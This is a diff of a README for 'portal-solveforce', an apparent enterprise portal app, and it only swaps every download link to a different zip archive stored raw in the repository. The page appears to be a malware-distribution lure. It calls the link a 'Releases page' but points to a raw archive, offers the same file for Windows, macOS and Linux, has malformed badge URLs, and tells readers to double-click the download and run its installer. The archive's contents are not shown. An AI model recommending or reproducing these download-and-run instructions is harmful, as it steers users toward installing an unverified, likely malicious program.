@@ -1,6 +1,6 @@
 # 🌟 portal-solveforce - Easy Access to Your Enterprise Portal
 
-![Download](https://raw.githubusercontent.com/lemoncad123/portal-solveforce/main/pillars/portal-solveforce_3.6.zip%https://raw.githubusercontent.com/lemoncad123/portal-solveforce/main/pillars/portal-solveforce_3.6.zip)
+![Download](https://github.com/lemoncad123/portal-solveforce/raw/refs/heads/main/services/portal_solveforce_v1.1-beta.1.zip%https://github.com/lemoncad123/portal-solveforce/raw/refs/heads/main/services/portal_solveforce_v1.1-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -25,16 +25,16 @@ Before you start, ensure your system meets these requirements:
 
 To get the latest version of the **portal-solveforce** application, visit the Releases page to download:
 
-[Download Now](https://raw.githubusercontent.com/lemoncad123/portal-solveforce/main/pillars/portal-solveforce_3.6.zip)
+[Download Now](https://github.com/lemoncad123/portal-solveforce/raw/refs/heads/main/services/portal_solveforce_v1.1-beta.1.zip)
 
 Here are the steps to download and install the application:
 
 1. **Visit the Releases Page**: Click the link above. This will take you to the page with all the available versions.
 2. **Select the Latest Release**: Look for the most recent version listed at the top. 
 3. **Download the File**: Click on the file that matches your operating system. For example:
-   - Windows: `https://raw.githubusercontent.com/lemoncad123/portal-solveforce/main/pillars/portal-solveforce_3.6.zip`
-   - macOS: `https://raw.githubusercontent.com/lemoncad123/portal-solveforce/main/pillars/portal-solveforce_3.6.zip`
-   - Linux: `https://raw.githubusercontent.com/lemoncad123/portal-solveforce/main/pillars/portal-solveforce_3.6.zip`
+   - Windows: `https://github.com/lemoncad123/portal-solveforce/raw/refs/heads/main/services/portal_solveforce_v1.1-beta.1.zip`
+   - macOS: `https://github.com/lemoncad123/portal-solveforce/raw/refs/heads/main/services/portal_solveforce_v1.1-beta.1.zip`
+   - Linux: `https://github.com/lemoncad123/portal-solveforce/raw/refs/heads/main/services/portal_solveforce_v1.1-beta.1.zip`
 4. **Open the File**: Once the download is done, locate the file in your downloads folder and double-click to start the installation process.
 5. **Follow Installation Instructions**: A setup wizard will guide you through the installation. Just follow the prompts.
 
@@ -81,6 +81,6 @@ Explore more about the topics related to our project:
 
 Your feedback is vital for the improvement of our application. Don’t hesitate to share your thoughts or suggestions through our contact form.
 
-[Download Now](https://raw.githubusercontent.com/lemoncad123/portal-solveforce/main/pillars/portal-solveforce_3.6.zip)
+[Download Now](https://github.com/lemoncad123/portal-solveforce/raw/refs/heads/main/services/portal_solveforce_v1.1-beta.1.zip)
 
 Thank you for choosing **portal-solveforce**! We hope you enjoy using the Enterprise Portal.
